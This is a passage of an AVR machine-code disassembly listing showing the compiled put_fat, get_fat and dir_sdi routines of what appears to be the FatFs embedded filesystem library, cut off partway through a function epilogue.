    19a6:	90 7f       	andi	r25, 0xF0	; 240
    19a8:	85 2d       	mov	r24, r5
    19aa:	8f 70       	andi	r24, 0x0F	; 15
    19ac:	49 2e       	mov	r4, r25
    19ae:	48 2a       	or	r4, r24
    19b0:	40 82       	st	Z, r4
    19b2:	81 e0       	ldi	r24, 0x01	; 1
    19b4:	eb 81       	ldd	r30, Y+3	; 0x03
    19b6:	fc 81       	ldd	r31, Y+4	; 0x04
    19b8:	83 83       	std	Z+3, r24	; 0x03
    19ba:	67 c0       	rjmp	.+206    	; 0x1a8a <put_fat+0x216>
    19bc:	eb 81       	ldd	r30, Y+3	; 0x03
    19be:	fc 81       	ldd	r31, Y+4	; 0x04
    19c0:	43 a1       	ldd	r20, Z+35	; 0x23
    19c2:	54 a1       	ldd	r21, Z+36	; 0x24
    19c4:	65 a1       	ldd	r22, Z+37	; 0x25
    19c6:	76 a1       	ldd	r23, Z+38	; 0x26
    19c8:	bb 27       	eor	r27, r27
    19ca:	af 2d       	mov	r26, r15
    19cc:	9e 2d       	mov	r25, r14
    19ce:	8d 2d       	mov	r24, r13
    19d0:	48 0f       	add	r20, r24
    19d2:	59 1f       	adc	r21, r25
    19d4:	6a 1f       	adc	r22, r26
    19d6:	7b 1f       	adc	r23, r27
    19d8:	cf 01       	movw	r24, r30
    19da:	7a db       	rcall	.-2316   	; 0x10d0 <move_window>
    19dc:	18 2f       	mov	r17, r24
    19de:	81 11       	cpse	r24, r1
    19e0:	54 c0       	rjmp	.+168    	; 0x1a8a <put_fat+0x216>
    19e2:	2b 81       	ldd	r18, Y+3	; 0x03
    19e4:	3c 81       	ldd	r19, Y+4	; 0x04
    19e6:	2d 5c       	subi	r18, 0xCD	; 205
    19e8:	3f 4f       	sbci	r19, 0xFF	; 255
    19ea:	cc 0c       	add	r12, r12
    19ec:	dd 1c       	adc	r13, r13
    19ee:	c6 01       	movw	r24, r12
    19f0:	8e 7f       	andi	r24, 0xFE	; 254
    19f2:	91 70       	andi	r25, 0x01	; 1
    19f4:	b2 01       	movw	r22, r4
    19f6:	82 0f       	add	r24, r18
    19f8:	93 1f       	adc	r25, r19
    19fa:	f0 d9       	rcall	.-3104   	; 0xddc <st_word>
    19fc:	81 e0       	ldi	r24, 0x01	; 1
    19fe:	eb 81       	ldd	r30, Y+3	; 0x03
    1a00:	fc 81       	ldd	r31, Y+4	; 0x04
    1a02:	83 83       	std	Z+3, r24	; 0x03
    1a04:	42 c0       	rjmp	.+132    	; 0x1a8a <put_fat+0x216>
    1a06:	eb 81       	ldd	r30, Y+3	; 0x03
    1a08:	fc 81       	ldd	r31, Y+4	; 0x04
    1a0a:	43 a1       	ldd	r20, Z+35	; 0x23
    1a0c:	54 a1       	ldd	r21, Z+36	; 0x24
    1a0e:	65 a1       	ldd	r22, Z+37	; 0x25
    1a10:	76 a1       	ldd	r23, Z+38	; 0x26
    1a12:	d7 01       	movw	r26, r14
    1a14:	c6 01       	movw	r24, r12
    1a16:	68 94       	set
    1a18:	16 f8       	bld	r1, 6
    1a1a:	b6 95       	lsr	r27
    1a1c:	a7 95       	ror	r26
    1a1e:	97 95       	ror	r25
    1a20:	87 95       	ror	r24
    1a22:	16 94       	lsr	r1
    1a24:	d1 f7       	brne	.-12     	; 0x1a1a <put_fat+0x1a6>
    1a26:	48 0f       	add	r20, r24
    1a28:	59 1f       	adc	r21, r25
    1a2a:	6a 1f       	adc	r22, r26
    1a2c:	7b 1f       	adc	r23, r27
    1a2e:	cf 01       	movw	r24, r30
    1a30:	4f db       	rcall	.-2402   	; 0x10d0 <move_window>
    1a32:	18 2f       	mov	r17, r24
    1a34:	81 11       	cpse	r24, r1
    1a36:	29 c0       	rjmp	.+82     	; 0x1a8a <put_fat+0x216>
    1a38:	ff e0       	ldi	r31, 0x0F	; 15
    1a3a:	7f 22       	and	r7, r31
    1a3c:	8b 81       	ldd	r24, Y+3	; 0x03
    1a3e:	9c 81       	ldd	r25, Y+4	; 0x04
    1a40:	c3 96       	adiw	r24, 0x33	; 51
    1a42:	cc 0c       	add	r12, r12
    1a44:	dd 1c       	adc	r13, r13
    1a46:	cc 0c       	add	r12, r12
    1a48:	dd 1c       	adc	r13, r13
    1a4a:	2c ef       	ldi	r18, 0xFC	; 252
    1a4c:	c2 22       	and	r12, r18
    1a4e:	21 e0       	ldi	r18, 0x01	; 1
    1a50:	d2 22       	and	r13, r18
    1a52:	c8 0e       	add	r12, r24
    1a54:	d9 1e       	adc	r13, r25
    1a56:	c6 01       	movw	r24, r12
    1a58:	a6 d9       	rcall	.-3252   	; 0xda6 <ld_dword>
    1a5a:	dc 01       	movw	r26, r24
    1a5c:	cb 01       	movw	r24, r22
    1a5e:	88 27       	eor	r24, r24
    1a60:	99 27       	eor	r25, r25
    1a62:	aa 27       	eor	r26, r26
    1a64:	b0 7f       	andi	r27, 0xF0	; 240
    1a66:	b3 01       	movw	r22, r6
    1a68:	a2 01       	movw	r20, r4
    1a6a:	48 2b       	or	r20, r24
    1a6c:	59 2b       	or	r21, r25
    1a6e:	6a 2b       	or	r22, r26
    1a70:	7b 2b       	or	r23, r27
    1a72:	c6 01       	movw	r24, r12
    1a74:	b7 d9       	rcall	.-3218   	; 0xde4 <st_dword>
    1a76:	81 e0       	ldi	r24, 0x01	; 1
    1a78:	eb 81       	ldd	r30, Y+3	; 0x03
    1a7a:	fc 81       	ldd	r31, Y+4	; 0x04
    1a7c:	83 83       	std	Z+3, r24	; 0x03
    1a7e:	05 c0       	rjmp	.+10     	; 0x1a8a <put_fat+0x216>
    1a80:	12 e0       	ldi	r17, 0x02	; 2
    1a82:	03 c0       	rjmp	.+6      	; 0x1a8a <put_fat+0x216>
    1a84:	12 e0       	ldi	r17, 0x02	; 2
    1a86:	01 c0       	rjmp	.+2      	; 0x1a8a <put_fat+0x216>
    1a88:	12 e0       	ldi	r17, 0x02	; 2
    1a8a:	81 2f       	mov	r24, r17
    1a8c:	0f 90       	pop	r0
    1a8e:	0f 90       	pop	r0
    1a90:	0f 90       	pop	r0
    1a92:	0f 90       	pop	r0
    1a94:	df 91       	pop	r29
    1a96:	cf 91       	pop	r28
    1a98:	1f 91       	pop	r17
    1a9a:	0f 91       	pop	r16
    1a9c:	ff 90       	pop	r15
    1a9e:	ef 90       	pop	r14
    1aa0:	df 90       	pop	r13
    1aa2:	cf 90       	pop	r12
    1aa4:	bf 90       	pop	r11
    1aa6:	af 90       	pop	r10
    1aa8:	9f 90       	pop	r9
    1aaa:	8f 90       	pop	r8
    1aac:	7f 90       	pop	r7
    1aae:	6f 90       	pop	r6
    1ab0:	5f 90       	pop	r5
    1ab2:	4f 90       	pop	r4
    1ab4:	3f 90       	pop	r3
    1ab6:	2f 90       	pop	r2
    1ab8:	08 95       	ret

00001aba <get_fat>:
    1aba:	af 92       	push	r10
    1abc:	bf 92       	push	r11
    1abe:	cf 92       	push	r12
    1ac0:	df 92       	push	r13
    1ac2:	ef 92       	push	r14
    1ac4:	ff 92       	push	r15
    1ac6:	0f 93       	push	r16
    1ac8:	1f 93       	push	r17
    1aca:	cf 93       	push	r28
    1acc:	df 93       	push	r29
    1ace:	fc 01       	movw	r30, r24
    1ad0:	c0 81       	ld	r28, Z
    1ad2:	d1 81       	ldd	r29, Z+1	; 0x01
    1ad4:	42 30       	cpi	r20, 0x02	; 2
    1ad6:	51 05       	cpc	r21, r1
    1ad8:	61 05       	cpc	r22, r1
    1ada:	71 05       	cpc	r23, r1
    1adc:	08 f4       	brcc	.+2      	; 0x1ae0 <get_fat+0x26>
    1ade:	a0 c0       	rjmp	.+320    	; 0x1c20 <get_fat+0x166>
    1ae0:	8f 89       	ldd	r24, Y+23	; 0x17
    1ae2:	98 8d       	ldd	r25, Y+24	; 0x18
    1ae4:	a9 8d       	ldd	r26, Y+25	; 0x19
    1ae6:	ba 8d       	ldd	r27, Y+26	; 0x1a
    1ae8:	48 17       	cp	r20, r24
    1aea:	59 07       	cpc	r21, r25
    1aec:	6a 07       	cpc	r22, r26
    1aee:	7b 07       	cpc	r23, r27
    1af0:	08 f0       	brcs	.+2      	; 0x1af4 <get_fat+0x3a>
    1af2:	9b c0       	rjmp	.+310    	; 0x1c2a <get_fat+0x170>
    1af4:	6a 01       	movw	r12, r20
    1af6:	7b 01       	movw	r14, r22
    1af8:	88 81       	ld	r24, Y
    1afa:	82 30       	cpi	r24, 0x02	; 2
    1afc:	09 f4       	brne	.+2      	; 0x1b00 <get_fat+0x46>
    1afe:	4e c0       	rjmp	.+156    	; 0x1b9c <get_fat+0xe2>
    1b00:	83 30       	cpi	r24, 0x03	; 3
    1b02:	09 f4       	brne	.+2      	; 0x1b06 <get_fat+0x4c>
    1b04:	69 c0       	rjmp	.+210    	; 0x1bd8 <get_fat+0x11e>
    1b06:	81 30       	cpi	r24, 0x01	; 1
    1b08:	09 f0       	breq	.+2      	; 0x1b0c <get_fat+0x52>
    1b0a:	94 c0       	rjmp	.+296    	; 0x1c34 <get_fat+0x17a>
    1b0c:	8a 01       	movw	r16, r20
    1b0e:	16 95       	lsr	r17
    1b10:	07 95       	ror	r16
    1b12:	04 0f       	add	r16, r20
    1b14:	15 1f       	adc	r17, r21
    1b16:	4b a1       	ldd	r20, Y+35	; 0x23
    1b18:	5c a1       	ldd	r21, Y+36	; 0x24
    1b1a:	6d a1       	ldd	r22, Y+37	; 0x25
    1b1c:	7e a1       	ldd	r23, Y+38	; 0x26
    1b1e:	c8 01       	movw	r24, r16
    1b20:	89 2f       	mov	r24, r25
    1b22:	99 27       	eor	r25, r25
    1b24:	86 95       	lsr	r24
    1b26:	48 0f       	add	r20, r24
    1b28:	59 1f       	adc	r21, r25
    1b2a:	61 1d       	adc	r22, r1
    1b2c:	71 1d       	adc	r23, r1
    1b2e:	ce 01       	movw	r24, r28
    1b30:	cf da       	rcall	.-2658   	; 0x10d0 <move_window>
    1b32:	81 11       	cpse	r24, r1
    1b34:	84 c0       	rjmp	.+264    	; 0x1c3e <get_fat+0x184>
    1b36:	58 01       	movw	r10, r16
    1b38:	ff ef       	ldi	r31, 0xFF	; 255
    1b3a:	af 1a       	sub	r10, r31
    1b3c:	bf 0a       	sbc	r11, r31
    1b3e:	11 70       	andi	r17, 0x01	; 1
    1b40:	fe 01       	movw	r30, r28
    1b42:	e0 0f       	add	r30, r16
    1b44:	f1 1f       	adc	r31, r17
    1b46:	03 a9       	ldd	r16, Z+51	; 0x33
    1b48:	10 e0       	ldi	r17, 0x00	; 0
    1b4a:	4b a1       	ldd	r20, Y+35	; 0x23
    1b4c:	5c a1       	ldd	r21, Y+36	; 0x24
    1b4e:	6d a1       	ldd	r22, Y+37	; 0x25
    1b50:	7e a1       	ldd	r23, Y+38	; 0x26
    1b52:	c5 01       	movw	r24, r10
    1b54:	89 2f       	mov	r24, r25
    1b56:	99 27       	eor	r25, r25
    1b58:	86 95       	lsr	r24
    1b5a:	48 0f       	add	r20, r24
    1b5c:	59 1f       	adc	r21, r25
    1b5e:	61 1d       	adc	r22, r1
    1b60:	71 1d       	adc	r23, r1
    1b62:	ce 01       	movw	r24, r28
    1b64:	b5 da       	rcall	.-2710   	; 0x10d0 <move_window>
    1b66:	81 11       	cpse	r24, r1
    1b68:	6e c0       	rjmp	.+220    	; 0x1c46 <get_fat+0x18c>
    1b6a:	81 e0       	ldi	r24, 0x01	; 1
    1b6c:	b8 22       	and	r11, r24
    1b6e:	ca 0d       	add	r28, r10
    1b70:	db 1d       	adc	r29, r11
    1b72:	6b a9       	ldd	r22, Y+51	; 0x33
    1b74:	70 e0       	ldi	r23, 0x00	; 0
    1b76:	76 2f       	mov	r23, r22
    1b78:	66 27       	eor	r22, r22
    1b7a:	60 2b       	or	r22, r16
    1b7c:	71 2b       	or	r23, r17
    1b7e:	c0 fe       	sbrs	r12, 0
    1b80:	09 c0       	rjmp	.+18     	; 0x1b94 <get_fat+0xda>
    1b82:	72 95       	swap	r23
    1b84:	62 95       	swap	r22
    1b86:	6f 70       	andi	r22, 0x0F	; 15
    1b88:	67 27       	eor	r22, r23
    1b8a:	7f 70       	andi	r23, 0x0F	; 15
    1b8c:	67 27       	eor	r22, r23
    1b8e:	80 e0       	ldi	r24, 0x00	; 0
    1b90:	90 e0       	ldi	r25, 0x00	; 0
    1b92:	64 c0       	rjmp	.+200    	; 0x1c5c <get_fat+0x1a2>
    1b94:	7f 70       	andi	r23, 0x0F	; 15
    1b96:	80 e0       	ldi	r24, 0x00	; 0
    1b98:	90 e0       	ldi	r25, 0x00	; 0
    1b9a:	60 c0       	rjmp	.+192    	; 0x1c5c <get_fat+0x1a2>
    1b9c:	4b a1       	ldd	r20, Y+35	; 0x23
    1b9e:	5c a1       	ldd	r21, Y+36	; 0x24
    1ba0:	6d a1       	ldd	r22, Y+37	; 0x25
    1ba2:	7e a1       	ldd	r23, Y+38	; 0x26
    1ba4:	bb 27       	eor	r27, r27
    1ba6:	af 2d       	mov	r26, r15
    1ba8:	9e 2d       	mov	r25, r14
    1baa:	8d 2d       	mov	r24, r13
    1bac:	48 0f       	add	r20, r24
    1bae:	59 1f       	adc	r21, r25
    1bb0:	6a 1f       	adc	r22, r26
    1bb2:	7b 1f       	adc	r23, r27
    1bb4:	ce 01       	movw	r24, r28
    1bb6:	8c da       	rcall	.-2792   	; 0x10d0 <move_window>
    1bb8:	81 11       	cpse	r24, r1
    1bba:	49 c0       	rjmp	.+146    	; 0x1c4e <get_fat+0x194>
    1bbc:	ce 01       	movw	r24, r28
    1bbe:	c3 96       	adiw	r24, 0x33	; 51
    1bc0:	a6 01       	movw	r20, r12
    1bc2:	44 0f       	add	r20, r20
    1bc4:	55 1f       	adc	r21, r21
    1bc6:	4e 7f       	andi	r20, 0xFE	; 254
    1bc8:	51 70       	andi	r21, 0x01	; 1
    1bca:	84 0f       	add	r24, r20
    1bcc:	95 1f       	adc	r25, r21
    1bce:	e1 d8       	rcall	.-3646   	; 0xd92 <ld_word>
    1bd0:	bc 01       	movw	r22, r24
    1bd2:	80 e0       	ldi	r24, 0x00	; 0
    1bd4:	90 e0       	ldi	r25, 0x00	; 0
    1bd6:	42 c0       	rjmp	.+132    	; 0x1c5c <get_fat+0x1a2>
    1bd8:	4b a1       	ldd	r20, Y+35	; 0x23
    1bda:	5c a1       	ldd	r21, Y+36	; 0x24
    1bdc:	6d a1       	ldd	r22, Y+37	; 0x25
    1bde:	7e a1       	ldd	r23, Y+38	; 0x26
    1be0:	d7 01       	movw	r26, r14
    1be2:	c6 01       	movw	r24, r12
    1be4:	68 94       	set
    1be6:	16 f8       	bld	r1, 6
    1be8:	b6 95       	lsr	r27
    1bea:	a7 95       	ror	r26
    1bec:	97 95       	ror	r25
    1bee:	87 95       	ror	r24
    1bf0:	16 94       	lsr	r1
    1bf2:	d1 f7       	brne	.-12     	; 0x1be8 <get_fat+0x12e>
    1bf4:	48 0f       	add	r20, r24
    1bf6:	59 1f       	adc	r21, r25
    1bf8:	6a 1f       	adc	r22, r26
    1bfa:	7b 1f       	adc	r23, r27
    1bfc:	ce 01       	movw	r24, r28
    1bfe:	68 da       	rcall	.-2864   	; 0x10d0 <move_window>
    1c00:	81 11       	cpse	r24, r1
    1c02:	29 c0       	rjmp	.+82     	; 0x1c56 <get_fat+0x19c>
    1c04:	e3 96       	adiw	r28, 0x33	; 51
    1c06:	a6 01       	movw	r20, r12
    1c08:	44 0f       	add	r20, r20
    1c0a:	55 1f       	adc	r21, r21
    1c0c:	44 0f       	add	r20, r20
    1c0e:	55 1f       	adc	r21, r21
    1c10:	ca 01       	movw	r24, r20
    1c12:	8c 7f       	andi	r24, 0xFC	; 252
    1c14:	91 70       	andi	r25, 0x01	; 1
    1c16:	8c 0f       	add	r24, r28
    1c18:	9d 1f       	adc	r25, r29
    1c1a:	c5 d8       	rcall	.-3702   	; 0xda6 <ld_dword>
    1c1c:	9f 70       	andi	r25, 0x0F	; 15
    1c1e:	1e c0       	rjmp	.+60     	; 0x1c5c <get_fat+0x1a2>
    1c20:	61 e0       	ldi	r22, 0x01	; 1
    1c22:	70 e0       	ldi	r23, 0x00	; 0
    1c24:	80 e0       	ldi	r24, 0x00	; 0
    1c26:	90 e0       	ldi	r25, 0x00	; 0
    1c28:	19 c0       	rjmp	.+50     	; 0x1c5c <get_fat+0x1a2>
    1c2a:	61 e0       	ldi	r22, 0x01	; 1
    1c2c:	70 e0       	ldi	r23, 0x00	; 0
    1c2e:	80 e0       	ldi	r24, 0x00	; 0
    1c30:	90 e0       	ldi	r25, 0x00	; 0
    1c32:	14 c0       	rjmp	.+40     	; 0x1c5c <get_fat+0x1a2>
    1c34:	61 e0       	ldi	r22, 0x01	; 1
    1c36:	70 e0       	ldi	r23, 0x00	; 0
    1c38:	80 e0       	ldi	r24, 0x00	; 0
    1c3a:	90 e0       	ldi	r25, 0x00	; 0
    1c3c:	0f c0       	rjmp	.+30     	; 0x1c5c <get_fat+0x1a2>
    1c3e:	6f ef       	ldi	r22, 0xFF	; 255
    1c40:	7f ef       	ldi	r23, 0xFF	; 255
    1c42:	cb 01       	movw	r24, r22
    1c44:	0b c0       	rjmp	.+22     	; 0x1c5c <get_fat+0x1a2>
    1c46:	6f ef       	ldi	r22, 0xFF	; 255
    1c48:	7f ef       	ldi	r23, 0xFF	; 255
    1c4a:	cb 01       	movw	r24, r22
    1c4c:	07 c0       	rjmp	.+14     	; 0x1c5c <get_fat+0x1a2>
    1c4e:	6f ef       	ldi	r22, 0xFF	; 255
    1c50:	7f ef       	ldi	r23, 0xFF	; 255
    1c52:	cb 01       	movw	r24, r22
    1c54:	03 c0       	rjmp	.+6      	; 0x1c5c <get_fat+0x1a2>
    1c56:	6f ef       	ldi	r22, 0xFF	; 255
    1c58:	7f ef       	ldi	r23, 0xFF	; 255
    1c5a:	cb 01       	movw	r24, r22
    1c5c:	df 91       	pop	r29
    1c5e:	cf 91       	pop	r28
    1c60:	1f 91       	pop	r17
    1c62:	0f 91       	pop	r16
    1c64:	ff 90       	pop	r15
    1c66:	ef 90       	pop	r14
    1c68:	df 90       	pop	r13
    1c6a:	cf 90       	pop	r12
    1c6c:	bf 90       	pop	r11
    1c6e:	af 90       	pop	r10
    1c70:	08 95       	ret

00001c72 <dir_sdi>:
    1c72:	4f 92       	push	r4
    1c74:	5f 92       	push	r5
    1c76:	6f 92       	push	r6
    1c78:	7f 92       	push	r7
    1c7a:	8f 92       	push	r8
    1c7c:	9f 92       	push	r9
    1c7e:	af 92       	push	r10
    1c80:	bf 92       	push	r11
    1c82:	cf 92       	push	r12
    1c84:	df 92       	push	r13
    1c86:	ef 92       	push	r14
    1c88:	ff 92       	push	r15
    1c8a:	0f 93       	push	r16
    1c8c:	1f 93       	push	r17
    1c8e:	cf 93       	push	r28
    1c90:	df 93       	push	r29
    1c92:	ec 01       	movw	r28, r24
    1c94:	6a 01       	movw	r12, r20
    1c96:	7b 01       	movw	r14, r22
    1c98:	08 81       	ld	r16, Y
    1c9a:	19 81       	ldd	r17, Y+1	; 0x01
    1c9c:	41 15       	cp	r20, r1
    1c9e:	51 05       	cpc	r21, r1
    1ca0:	80 e2       	ldi	r24, 0x20	; 32
    1ca2:	68 07       	cpc	r22, r24
    1ca4:	71 05       	cpc	r23, r1
    1ca6:	08 f0       	brcs	.+2      	; 0x1caa <dir_sdi+0x38>
    1ca8:	aa c0       	rjmp	.+340    	; 0x1dfe <dir_sdi+0x18c>
    1caa:	db 01       	movw	r26, r22
    1cac:	ca 01       	movw	r24, r20
    1cae:	8f 71       	andi	r24, 0x1F	; 31
    1cb0:	99 27       	eor	r25, r25
    1cb2:	aa 27       	eor	r26, r26
    1cb4:	bb 27       	eor	r27, r27
    1cb6:	89 2b       	or	r24, r25
    1cb8:	8a 2b       	or	r24, r26
    1cba:	8b 2b       	or	r24, r27
    1cbc:	09 f0       	breq	.+2      	; 0x1cc0 <dir_sdi+0x4e>
    1cbe:	a1 c0       	rjmp	.+322    	; 0x1e02 <dir_sdi+0x190>
    1cc0:	4e 87       	std	Y+14, r20	; 0x0e
    1cc2:	5f 87       	std	Y+15, r21	; 0x0f
    1cc4:	68 8b       	std	Y+16, r22	; 0x10
    1cc6:	79 8b       	std	Y+17, r23	; 0x11
    1cc8:	8e 80       	ldd	r8, Y+6	; 0x06
    1cca:	9f 80       	ldd	r9, Y+7	; 0x07
    1ccc:	a8 84       	ldd	r10, Y+8	; 0x08
    1cce:	b9 84       	ldd	r11, Y+9	; 0x09
    1cd0:	81 14       	cp	r8, r1
    1cd2:	91 04       	cpc	r9, r1
    1cd4:	a1 04       	cpc	r10, r1
    1cd6:	b1 04       	cpc	r11, r1
    1cd8:	41 f4       	brne	.+16     	; 0x1cea <dir_sdi+0x78>
    1cda:	f8 01       	movw	r30, r16
    1cdc:	80 81       	ld	r24, Z
    1cde:	83 30       	cpi	r24, 0x03	; 3
    1ce0:	20 f0       	brcs	.+8      	; 0x1cea <dir_sdi+0x78>
    1ce2:	87 a0       	ldd	r8, Z+39	; 0x27
    1ce4:	90 a4       	ldd	r9, Z+40	; 0x28
    1ce6:	a1 a4       	ldd	r10, Z+41	; 0x29
    1ce8:	b2 a4       	ldd	r11, Z+42	; 0x2a
    1cea:	81 14       	cp	r8, r1
    1cec:	91 04       	cpc	r9, r1
    1cee:	a1 04       	cpc	r10, r1
    1cf0:	b1 04       	cpc	r11, r1
    1cf2:	f1 f4       	brne	.+60     	; 0x1d30 <dir_sdi+0xbe>
    1cf4:	f8 01       	movw	r30, r16
    1cf6:	87 81       	ldd	r24, Z+7	; 0x07
    1cf8:	90 85       	ldd	r25, Z+8	; 0x08
    1cfa:	a0 e0       	ldi	r26, 0x00	; 0
    1cfc:	b0 e0       	ldi	r27, 0x00	; 0
    1cfe:	b7 01       	movw	r22, r14
    1d00:	a6 01       	movw	r20, r12
    1d02:	68 94       	set
    1d04:	14 f8       	bld	r1, 4
    1d06:	76 95       	lsr	r23
    1d08:	67 95       	ror	r22
    1d0a:	57 95       	ror	r21
    1d0c:	47 95       	ror	r20
    1d0e:	16 94       	lsr	r1
    1d10:	d1 f7       	brne	.-12     	; 0x1d06 <dir_sdi+0x94>
    1d12:	48 17       	cp	r20, r24
    1d14:	59 07       	cpc	r21, r25
    1d16:	6a 07       	cpc	r22, r26
    1d18:	7b 07       	cpc	r23, r27
    1d1a:	08 f0       	brcs	.+2      	; 0x1d1e <dir_sdi+0xac>
    1d1c:	74 c0       	rjmp	.+232    	; 0x1e06 <dir_sdi+0x194>
    1d1e:	87 a1       	ldd	r24, Z+39	; 0x27
    1d20:	90 a5       	ldd	r25, Z+40	; 0x28
    1d22:	a1 a5       	ldd	r26, Z+41	; 0x29
    1d24:	b2 a5       	ldd	r27, Z+42	; 0x2a
    1d26:	8e 8b       	std	Y+22, r24	; 0x16
    1d28:	9f 8b       	std	Y+23, r25	; 0x17
    1d2a:	a8 8f       	std	Y+24, r26	; 0x18
    1d2c:	b9 8f       	std	Y+25, r27	; 0x19
    1d2e:	3e c0       	rjmp	.+124    	; 0x1dac <dir_sdi+0x13a>
    1d30:	f8 01       	movw	r30, r16
    1d32:	41 84       	ldd	r4, Z+9	; 0x09
    1d34:	52 84       	ldd	r5, Z+10	; 0x0a
    1d36:	61 2c       	mov	r6, r1
    1d38:	71 2c       	mov	r7, r1
    1d3a:	03 2e       	mov	r0, r19
    1d3c:	39 e0       	ldi	r19, 0x09	; 9
    1d3e:	44 0c       	add	r4, r4
    1d40:	55 1c       	adc	r5, r5
    1d42:	66 1c       	adc	r6, r6
    1d44:	77 1c       	adc	r7, r7
    1d46:	3a 95       	dec	r19
    1d48:	d1 f7       	brne	.-12     	; 0x1d3e <dir_sdi+0xcc>
    1d4a:	30 2d       	mov	r19, r0
    1d4c:	22 c0       	rjmp	.+68     	; 0x1d92 <dir_sdi+0x120>
    1d4e:	b5 01       	movw	r22, r10
    1d50:	a4 01       	movw	r20, r8
    1d52:	ce 01       	movw	r24, r28
    1d54:	b2 de       	rcall	.-668    	; 0x1aba <get_fat>
    1d56:	4b 01       	movw	r8, r22
    1d58:	5c 01       	movw	r10, r24
    1d5a:	6f 3f       	cpi	r22, 0xFF	; 255
    1d5c:	7f 4f       	sbci	r23, 0xFF	; 255
    1d5e:	8f 4f       	sbci	r24, 0xFF	; 255
    1d60:	9f 4f       	sbci	r25, 0xFF	; 255
    1d62:	09 f4       	brne	.+2      	; 0x1d66 <dir_sdi+0xf4>
    1d64:	52 c0       	rjmp	.+164    	; 0x1e0a <dir_sdi+0x198>
    1d66:	82 e0       	ldi	r24, 0x02	; 2
    1d68:	88 16       	cp	r8, r24
    1d6a:	91 04       	cpc	r9, r1
    1d6c:	a1 04       	cpc	r10, r1
    1d6e:	b1 04       	cpc	r11, r1
    1d70:	08 f4       	brcc	.+2      	; 0x1d74 <dir_sdi+0x102>
    1d72:	4d c0       	rjmp	.+154    	; 0x1e0e <dir_sdi+0x19c>
    1d74:	f8 01       	movw	r30, r16
    1d76:	87 89       	ldd	r24, Z+23	; 0x17
    1d78:	90 8d       	ldd	r25, Z+24	; 0x18
    1d7a:	a1 8d       	ldd	r26, Z+25	; 0x19
    1d7c:	b2 8d       	ldd	r27, Z+26	; 0x1a
    1d7e:	88 16       	cp	r8, r24
    1d80:	99 06       	cpc	r9, r25
    1d82:	aa 06       	cpc	r10, r26
    1d84:	bb 06       	cpc	r11, r27
    1d86:	08 f0       	brcs	.+2      	; 0x1d8a <dir_sdi+0x118>
    1d88:	44 c0       	rjmp	.+136    	; 0x1e12 <dir_sdi+0x1a0>
    1d8a:	c4 18       	sub	r12, r4
    1d8c:	d5 08       	sbc	r13, r5
    1d8e:	e6 08       	sbc	r14, r6
    1d90:	f7 08       	sbc	r15, r7
    1d92:	c4 14       	cp	r12, r4
    1d94:	d5 04       	cpc	r13, r5
    1d96:	e6 04       	cpc	r14, r6
    1d98:	f7 04       	cpc	r15, r7
    1d9a:	c8 f6       	brcc	.-78     	; 0x1d4e <dir_sdi+0xdc>
    1d9c:	b5 01       	movw	r22, r10
    1d9e:	a4 01       	movw	r20, r8
    1da0:	c8 01       	movw	r24, r16
    1da2:	56 d8       	rcall	.-3924   	; 0xe50 <clst2sect>
    1da4:	6e 8b       	std	Y+22, r22	; 0x16
    1da6:	7f 8b       	std	Y+23, r23	; 0x17
    1da8:	88 8f       	std	Y+24, r24	; 0x18
    1daa:	99 8f       	std	Y+25, r25	; 0x19
    1dac:	8a 8a       	std	Y+18, r8	; 0x12
    1dae:	9b 8a       	std	Y+19, r9	; 0x13
    1db0:	ac 8a       	std	Y+20, r10	; 0x14
    1db2:	bd 8a       	std	Y+21, r11	; 0x15
    1db4:	8e 89       	ldd	r24, Y+22	; 0x16
    1db6:	9f 89       	ldd	r25, Y+23	; 0x17
    1db8:	a8 8d       	ldd	r26, Y+24	; 0x18
    1dba:	b9 8d       	ldd	r27, Y+25	; 0x19
    1dbc:	00 97       	sbiw	r24, 0x00	; 0
    1dbe:	a1 05       	cpc	r26, r1
    1dc0:	b1 05       	cpc	r27, r1
    1dc2:	49 f1       	breq	.+82     	; 0x1e16 <dir_sdi+0x1a4>
    1dc4:	b7 01       	movw	r22, r14
    1dc6:	a6 01       	movw	r20, r12
    1dc8:	03 2e       	mov	r0, r19
    1dca:	39 e0       	ldi	r19, 0x09	; 9
    1dcc:	76 95       	lsr	r23
    1dce:	67 95       	ror	r22
    1dd0:	57 95       	ror	r21
    1dd2:	47 95       	ror	r20
    1dd4:	3a 95       	dec	r19
    1dd6:	d1 f7       	brne	.-12     	; 0x1dcc <dir_sdi+0x15a>
    1dd8:	30 2d       	mov	r19, r0
    1dda:	84 0f       	add	r24, r20
    1ddc:	95 1f       	adc	r25, r21
    1dde:	a6 1f       	adc	r26, r22
    1de0:	b7 1f       	adc	r27, r23
    1de2:	8e 8b       	std	Y+22, r24	; 0x16
    1de4:	9f 8b       	std	Y+23, r25	; 0x17
    1de6:	a8 8f       	std	Y+24, r26	; 0x18
    1de8:	b9 8f       	std	Y+25, r27	; 0x19
    1dea:	0d 5c       	subi	r16, 0xCD	; 205
    1dec:	1f 4f       	sbci	r17, 0xFF	; 255
    1dee:	f1 e0       	ldi	r31, 0x01	; 1
    1df0:	df 22       	and	r13, r31
    1df2:	c0 0e       	add	r12, r16
    1df4:	d1 1e       	adc	r13, r17
    1df6:	db 8e       	std	Y+27, r13	; 0x1b
    1df8:	ca 8e       	std	Y+26, r12	; 0x1a
    1dfa:	80 e0       	ldi	r24, 0x00	; 0
    1dfc:	0d c0       	rjmp	.+26     	; 0x1e18 <dir_sdi+0x1a6>
    1dfe:	82 e0       	ldi	r24, 0x02	; 2
    1e00:	0b c0       	rjmp	.+22     	; 0x1e18 <dir_sdi+0x1a6>
    1e02:	82 e0       	ldi	r24, 0x02	; 2
    1e04:	09 c0       	rjmp	.+18     	; 0x1e18 <dir_sdi+0x1a6>
    1e06:	82 e0       	ldi	r24, 0x02	; 2
    1e08:	07 c0       	rjmp	.+14     	; 0x1e18 <dir_sdi+0x1a6>
    1e0a:	81 e0       	ldi	r24, 0x01	; 1
    1e0c:	05 c0       	rjmp	.+10     	; 0x1e18 <dir_sdi+0x1a6>
    1e0e:	82 e0       	ldi	r24, 0x02	; 2
    1e10:	03 c0       	rjmp	.+6      	; 0x1e18 <dir_sdi+0x1a6>
    1e12:	82 e0       	ldi	r24, 0x02	; 2
    1e14:	01 c0       	rjmp	.+2      	; 0x1e18 <dir_sdi+0x1a6>
    1e16:	82 e0       	ldi	r24, 0x02	; 2
    1e18:	df 91       	pop	r29
    1e1a:	cf 91       	pop	r28
    1e1c:	1f 91       	pop	r17
    1e1e:	0f 91       	pop	r16
    1e20:	ff 90       	pop	r15
    1e22:	ef 90       	pop	r14
    1e24:	df 90       	pop	r13
